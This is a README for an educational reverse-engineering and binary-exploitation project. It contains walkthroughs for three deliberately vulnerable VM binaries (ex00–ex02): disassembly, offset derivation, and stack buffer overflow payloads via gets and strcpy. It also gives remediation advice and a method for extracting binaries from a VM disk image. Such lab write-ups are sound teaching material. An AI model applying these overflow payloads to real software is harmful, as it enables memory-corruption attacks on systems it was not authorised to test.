# Hole-In-Bin — Reverse Engineering & Binary Exploitation

> **Educational project.** Every piece of analysis and exploitation here was performed
> **only** against the binaries shipped inside the provided, isolated VM
> (`/opt/hole-in-bin`). Nothing here targets any live, third-party, or production system.
> The techniques are the same ones used by vulnerability researchers and red teams — used
> here solely to learn how the bugs work and how to fix them.

The project is a ladder of 12 x86 (32-bit) binaries, `ex00` … `ex11`. Each prints a specific
"win" message once you satisfy its condition (overwrite a variable, redirect control flow,
pop a shell, …). Per the project rules, **all** reverse engineering was done with
**disassemblers/debuggers only** (objdump, GDB, Ghidra Listing view) — **no decompiler**.

## Table of Contents
- [Environment & Tooling](#environment--tooling)
- [Binary Protections (global)](#binary-protections-global)
- [Methodology](#methodology)
- [Challenge Walkthroughs](#challenge-walkthroughs)
  - [ex00 — overwrite an adjacent variable](#ex00--overwrite-an-adjacent-variable)
- [Remediation Suggestions](#remediation-suggestions)
- [Ethical Hacking Report](#ethical-hacking-report)
- [Bonus](#bonus)
- [Appendix A — Extracting the binaries without booting the VM](#appendix-a--extracting-the-binaries-without-booting-the-vm)

---

## Environment & Tooling

- **Target VM:** provided `hole-in-bin` image (VirtualBox OVA). Login `user` / `user`.
  Userland is 32-bit glibc **2.19** (Ubuntu 14.04-era). The VM ships `gdb`, `ltrace`,
  `strace`, `objdump`, `python`/`python3` — all allowed tools.
- **Challenge binaries:** `/opt/hole-in-bin/ex00 … ex11`, each with a `bin` + `README.txt`.
- **Allowed tools:** Ghidra (Listing/Assembly view **only**), GDB, PEDA, radare2, Python, Bash.
- **Prohibited:** decompilers / decompiler views, automated external exploitation frameworks.

**Repo layout**

```
challenges/exNN/bin         the target binary (copied out of the VM)
challenges/exNN/README.txt  the original per-challenge brief
scripts/exNN.py             payload generator for challenge NN
scripts/checksec.sh         readelf-based protection check (no external deps)
scripts/runlocal.sh         run a 32-bit VM binary locally under the VM's own loader+libc
```

> **Where exploits run:** the audit is performed **inside the VM**, so the exploits are
> written to run there (`python3 scripts/exNN.py | /opt/hole-in-bin/exNN/bin`). For
> development they were also verified on the host by running each binary under the VM's
> **exact** extracted loader (`ld-2.19.so`) and libc (`libc-2.19.so`) via
> `scripts/runlocal.sh`, so local results match the VM. Address-dependent exploits assume
> **ASLR disabled** in the VM (`sysctl kernel.randomize_va_space=0`), which is the standard
> configuration for these exercises — confirm with `cat /proc/sys/kernel/randomize_va_space`.

---

## Binary Protections (global)

Measured with `scripts/checksec.sh` (see script for how each is derived from `readelf`):

| Binary | Arch | NX (exec-stack) | PIE | Stack Canary | RELRO |
|--------|------|-----------------|-----|--------------|-------|
| ex00–ex11 | i386 | **No** (stack is executable) | **No** (fixed addresses) | **No** | **No** |

Consequences we rely on throughout:

- **No canary** → a stack buffer overflow can reach the saved return address with no detection.
- **No PIE** → code, PLT/GOT and global addresses are fixed and known at link time
  (readable with `objdump`/`readelf`), so no leak is needed to find them.
- **NX off** → the stack is executable, so injected shellcode on the stack can be run (ex09).
- **No RELRO** → the GOT is writable, enabling GOT-overwrite via format-string/overflow bugs.

---

## Methodology

The same disciplined loop was applied to every binary:

1. **Recon** — `file`, `scripts/checksec.sh`, `readelf -a`, `strings`: architecture, protections, win strings.
2. **Static analysis** — `objdump -d -M intel` (and GDB `disassemble` / Ghidra Listing view) to
   map `main`, locate the vulnerable input call, and read the win condition straight from assembly.
3. **Offset discovery** — derive the exact buffer→target distance from the stack frame
   (`sub esp, N` + the `lea`/`mov` offsets), cross-checked dynamically in GDB with a cyclic pattern.
4. **Exploit development** — craft the payload (padding + value/address/shellcode), scripted in Python.
5. **Verification** — run the exploit and confirm the exact win message.
6. **Remediation** — note the source-level fix and the compiler/OS hardening that would stop it.

---

## Challenge Walkthroughs

### ex00 — overwrite an adjacent variable

**Goal (`README.txt`):** see *“you have changed the 'modified' variable”*.

**Vulnerability class:** stack buffer overflow into an adjacent local variable (CWE-787, out-of-bounds write) via the unbounded `gets()`.

**Disassembly (`objdump -d -M intel challenges/ex00/bin`, `main`):**

```asm
80483f4 <main>:
  80483f4: push   ebp
  80483f5: mov    ebp,esp
  80483f7: and    esp,0xfffffff0        ; align stack to 16 bytes
  80483fa: sub    esp,0x60              ; reserve 0x60 bytes for locals
  80483fd: mov    DWORD PTR [esp+0x5c],0x0   ; modified = 0
  8048405: lea    eax,[esp+0x1c]        ; eax = &buffer
  8048409: mov    DWORD PTR [esp],eax   ; arg0 = &buffer
  804840c: call   804830c <gets@plt>    ; gets(buffer)  <-- no bounds check
  8048411: mov    eax,DWORD PTR [esp+0x5c]   ; eax = modified
  8048415: test   eax,eax               ; modified == 0 ?
  8048417: je     8048427 <main+0x33>   ; if 0 -> "Try again?"
  8048419: mov    DWORD PTR [esp],0x8048500  ; else -> win string
  8048420: call   804832c <puts@plt>
  ...
  8048427: mov    DWORD PTR [esp],0x8048529  ; "Try again?"
  804842e: call   804832c <puts@plt>
```

**Reading it (the instructions that matter for the role-play):**

- `sub esp,0x60` reserves the local frame. Within it the compiler placed the input **buffer at `esp+0x1c`** and the **`modified` flag at `esp+0x5c`**.
- `lea eax,[esp+0x1c]` / `mov [esp],eax` / `call gets@plt` passes `&buffer` to `gets()`. `gets()` copies stdin **with no length limit**, so we control everything from `esp+0x1c` upward.
- `test eax,eax` + `je` is the check: if `modified` is still `0` we lose, otherwise we win.

**Offset:** `modified − buffer = 0x5c − 0x1c = 0x40 = 64` bytes. So 64 bytes fill the buffer up to (but not into) `modified`; the **65th** byte lands in `modified`.

**Exploit (`scripts/ex00.py`):** 64 padding bytes + 1 non-zero byte.

```bash
# In the VM:
python3 scripts/ex00.py | /opt/hole-in-bin/ex00/bin
# Local (dev) verification against the VM's own libc:
python3 scripts/ex00.py | scripts/runlocal.sh challenges/ex00/bin
```

**Result (verified):**
```
you have changed the 'modified' variable
```
(64 bytes alone still prints `Try again?`, confirming the offset is exact.)

**Key takeaway:** `gets()` is unfixably unsafe — it cannot know the buffer size. An
overflow doesn't need to reach the return address to matter; corrupting an *adjacent*
variable is already a security-relevant state change (here it flips an authorization-style flag).

---

### ex01 — overwrite a variable with an exact value

**Goal (`README.txt`):** see *“you have correctly got the variable to the right value”*.

**Vulnerability class:** stack buffer overflow via `strcpy()` of an attacker-controlled `argv[1]` (CWE-121).

**Disassembly (`main`, key lines):**

```asm
 804846d: cmp    DWORD PTR [ebp+0x8],0x1     ; if (argc == 1)
 8048471: jne    8048487
 8048482: call   errx@plt                    ;   errx(1, "...") — needs an argument
 8048487: mov    DWORD PTR [esp+0x5c],0x0    ; modified = 0
 804848f: mov    eax,DWORD PTR [ebp+0xc]     ; eax = argv
 8048492: add    eax,0x4                     ; &argv[1]
 8048495: mov    eax,DWORD PTR [eax]         ; argv[1]
 8048497: mov    DWORD PTR [esp+0x4],eax     ; src  = argv[1]
 804849b: lea    eax,[esp+0x1c]             ; dst  = &buffer
 80484a2: call   strcpy@plt                  ; strcpy(buffer, argv[1])  <-- overflow
 80484a7: mov    eax,DWORD PTR [esp+0x5c]    ; eax = modified
 80484ab: cmp    eax,0x61626364             ; modified == 0x61626364 ?
 80484b0: jne    80484c0
 80484b2: ... puts("you have correctly got the variable to the right value")
```

**Reading it:** `[ebp+0x8]` is `argc`, `[ebp+0xc]` is `argv`; `add eax,4` + deref selects
`argv[1]`. `strcpy` copies it into `buffer` at `esp+0x1c` with no length check. The win test is
an **exact** compare against `0x61626364` (not just non-zero like ex00).

**Offset:** `0x5c − 0x1c = 64` bytes. The 4 bytes after the padding must be the little-endian
encoding of `0x61626364`, i.e. the ASCII `"dcba"` (`64 63 62 61`). `strcpy` stops at a NUL, and
our payload has none, so it copies in full.

**Exploit (`scripts/ex01.py`):** `"A"*64 + "dcba"`, passed as the argument.

```bash
/opt/hole-in-bin/ex01/bin "$(python3 scripts/ex01.py)"
# local: scripts/runlocal.sh challenges/ex01/bin "$(python3 scripts/ex01.py)"
```

**Result (verified):** `you have correctly got the variable to the right value`
(a wrong value prints `Try again, you got 0x……`, which also leaks the overwritten bytes — handy for debugging the offset).

**Key takeaway:** `strcpy()` has the same flaw as `gets()` — it copies until a NUL with no
destination bound. Overflows can place a **precise** value, not just garbage, which is what makes
them usable to control program logic (and, later, addresses).

---

### ex02 — overwrite a variable from an environment variable

**Goal (`README.txt`):** see *“you have correctly modified the variable”*.

**Vulnerability class:** stack buffer overflow via `strcpy()` of an attacker-controlled **environment variable** (CWE-121).

**Disassembly (`main`, key lines):**

```asm
 804849d: mov    DWORD PTR [esp],0x80485e0   ; "GREENIE"
 80484a4: call   getenv@plt                  ; p = getenv("GREENIE")
 80484a9: mov    DWORD PTR [esp+0x5c],eax
 80484ad: cmp    DWORD PTR [esp+0x5c],0x0    ; p == NULL ?
 80484b2: jne    80484c8
 80484c3: call   errx@plt                    ;   errx(1,"please set the GREENIE ...")
 80484c8: mov    DWORD PTR [esp+0x58],0x0    ; var = 0
 80484d4: mov    [esp+0x4], eax              ; src = p
 80484d8: lea    eax,[esp+0x18]             ; dst = &buffer
 80484df: call   strcpy@plt                  ; strcpy(buffer, p)   <-- overflow
 80484e4: mov    eax,DWORD PTR [esp+0x58]
 80484e8: cmp    eax,0xd0a0d0a              ; var == 0x0d0a0d0a ?
 80484ed: jne    80484fd
 80484ef: ... puts("you have correctly modified the variable")
```

**Reading it:** the tainted input now comes from the **environment** (`getenv("GREENIE")`),
not argv/stdin — a reminder that *any* externally controlled string is attacker input.
`strcpy` copies it into `buffer` at `esp+0x18`; the win test compares the variable at
`esp+0x58` against `0x0d0a0d0a`.

**Offset:** `0x58 − 0x18 = 64` bytes. The target little-endian bytes are `0a 0d 0a 0d`
(`"\n\r\n\r"`). Because those are newline/CR bytes that a shell would mangle, `scripts/ex02.py`
sets the variable itself with `execve` and runs the target.

**Exploit (`scripts/ex02.py`):**

```bash
python3 scripts/ex02.py /opt/hole-in-bin/ex02/bin
# local: python3 scripts/ex02.py scripts/runlocal.sh challenges/ex02/bin
```

**Result (verified):** `you have correctly modified the variable` (no env set → `please set the GREENIE environment variable`).

**Key takeaway:** environment variables are untrusted input too. Also: when a payload contains
non-printable bytes, pass it through `execve`/process args rather than fighting shell quoting.

---

<!-- ex03 … ex11 walkthroughs are added as each challenge is completed. -->
_ex03 … ex11: in progress._

---

## Remediation Suggestions

_General + per-vulnerability fixes. Filled in as challenges complete. Baseline for ex00:_

- **Never use `gets()`** — replace with `fgets(buf, sizeof(buf), stdin)` which bounds the read.
- Build with modern defenses: `-fstack-protector-strong` (canary), `-D_FORTIFY_SOURCE=2`,
  `-Wl,-z,relro,-z,now` (full RELRO), non-executable stack (default), and `-pie -fPIE` + ASLR.
- Compiler warnings (`-Wall -Wextra`) flag `gets()` as dangerous; treat them as errors in CI.

---

## Ethical Hacking Report

### Importance of proper authorization
_TODO._

### Legal and ethical boundaries
_TODO._

### Responsible disclosure practices
_TODO._

---

## Bonus
- **Extracted the challenge binaries straight from the OVA disk image without booting the VM**
  (no root/sudo, no VirtualBox) — see [Appendix A](#appendix-a--extracting-the-binaries-without-booting-the-vm).
- Alternative exploitation paths, custom shellcode, and ROP are documented per challenge where applicable.

---

## Appendix A — Extracting the binaries without booting the VM

To analyze the binaries on the host, they were pulled directly out of the provided
`hole-in-bin.ova` using only user-space tools (no VirtualBox, no root):

1. **Unpack the OVA** (it's a tar): `tar xf hole-in-bin.ova` → `hole-in-bin-disk001.vmdk` (+ `.ovf`, `.mf`).
2. **Decompress the disk** — the VMDK is `streamOptimized` (gzip-compressed sparse), so convert
   to raw: `qemu-img convert -f vmdk -O raw hole-in-bin-disk001.vmdk disk.raw`.
   (`qemu-img` was unpacked locally from its `.deb` with `dpkg-deb -x`, so no `sudo` was needed.)
3. **Find the filesystem** — `fdisk -l disk.raw` shows the root is inside **LVM** (partition 5).
   The LVM metadata (stored as plain text in the PV) gives `pe_start = 384` and the `root` LV
   starting at physical extent 0 → the ext4 superblock sits at sector `501760 + 384 = 502144`.
4. **Carve the ext4 LV** with `dd` (byte-precise offset, sparse output).
5. **Read it without mounting** using `debugfs` from `e2fsprogs`:
   `debugfs -R "rdump /opt/hole-in-bin ./challenges" disk-root.ext4`.

The VM's loader (`ld-2.19.so`) and libc (`libc-2.19.so`) were extracted the same way so the
binaries can be run locally in a VM-faithful environment via `scripts/runlocal.sh`.
